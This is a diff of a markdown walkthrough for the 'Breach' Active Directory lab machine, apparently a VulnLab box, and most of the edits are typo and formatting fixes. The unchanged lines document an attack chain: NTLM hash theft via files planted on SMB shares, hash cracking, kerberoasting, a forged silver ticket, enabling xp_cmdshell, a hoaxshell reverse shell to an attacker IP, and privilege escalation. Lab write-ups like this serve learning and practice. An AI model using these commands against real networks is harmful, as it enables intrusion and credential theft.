@@ -85,7 +85,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Firstly, I found the domain which is `breach.vl` and the DC (Domain Controller) FQDN (Fully-Qualified Domain Name) which is `BREACHDC.breach.vl`.
 
-Starting by enumerating SMB, I can can into a null session and list the shares on the domain controller.
+Starting by enumerating SMB, I can get a null session and list the shares on the domain controller.
 ```
 smbclient -L //BREACHDC.breach.vl
 ```
@@ -129,7 +129,8 @@ Validate the users using `kerbrute`:
 ```
 ![](../img/27.png)
 
-https://github.com/Greenwolf/ntlm_theft
+![https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
+
 `NTLM_THEFT` is a tool that generates different types of hash theft documents. If you can write to an SMB share, always try to use it.
 ```
 python ~/Tools/AD/Sniffing/ntlm_theft/ntlm_theft.py -g all -s 10.8.3.153 -f Paycheck
@@ -139,7 +140,7 @@ Run responder:
 > sudo responder  -I tun0 -w -r -d -F -P -v                        
 ```
 First, I tried putting the files in every writable directory from the `Users` share but no luck.
-The directory that gets accessed by the victim is either `software` or `transfer` because once I started putting the files there, I got the hash.
+The directory that gets accessed by the victim is either `software` or `transfer` inside the `share` share because once I started putting the files there, I got the hash.
 ```
 recurse on
 prompt off
@@ -147,22 +148,25 @@ mput *
 ```
 ![](../img/28.png)
 
-I wanted to try to relay the hash, but then I noticed that signing is enabled so the only thing I can do is to try to crack it.
+I wanted to try to relay the hash, but then I noticed that smb signing is enabled so the only thing I can do is to try to crack it.
+
 Crack the hash using `hashcat`:
 ```
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 The user flag is inside `transfer/julia.wong/local.txt`.
+
 Retrieve data for bloodhound through `nxc`:
 ```
 nxc ldap 10.10.99.155 -u julia.wong -p 'Computer1' --bloodhound -c All --dns-server 10.10.99.155
 ```
 Remembering that port 1433 was present and we know there is a user called `svc_mssql`. 
+
 I tried to look for kerberoastable users, and we could perform kerberoast for `svc_mssql`.
 ```
 impacket-GetUserSPNs -request breach.vl/julia.wong:Computer1 -dc-ip 10.10.99.155
 ```
-!![](../img/29.png)
+![](../img/29.png)
 
 Crack the hash using hashcat:
 ```
@@ -174,17 +178,18 @@ impacket-mssqlclient breach.vl/svc_mssql:Trustno1@BREACHDC.breach.vl -windows-au
 ```
 I didn't find anything interesting inside the databases, and I cannot abuse `xp_cmdshell` at the moment.
 I own a service account, so using its password, I can create a silver ticket to impersonate the administrator user.
+
 I got the domain sid using bloodhound:
 
 ![](../img/30.png)
 
-I used https://md5decrypt.net/en/Ntlm/ to encrypt svc_mssql's password in ntlm.
+I used ![https://md5decrypt.net/en/Ntlm/](https://md5decrypt.net/en/Ntlm/) to encrypt svc_mssql's password in ntlm.
 
 Having the information we need, we can now craft the silver ticket using impacket's `ticketer`:
 ```
 impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 administrator
 ```
-Import it and connect to the SQLSERVER using the ticket and you will be enable to enable `xp_cmdshell`.
+Import it and connect to the SQLSERVER using the ticket and you will be able to enable `xp_cmdshell`.
 ![](../img/31.png)
 
 Enable xp_cmdshell:
@@ -209,6 +214,7 @@ python3 hoaxshell.py -s 10.8.3.153
 ![](../img/34.png)
 
 The privilege escalation can be performed by abusing `SeImpersonatePrivilege`.
+
 Running `whoami /priv`, I noticed that svc_mssql has that privilege (pretty usual for service accounts).
 
 https://github.com/tylerdotrar/SigmaPotato
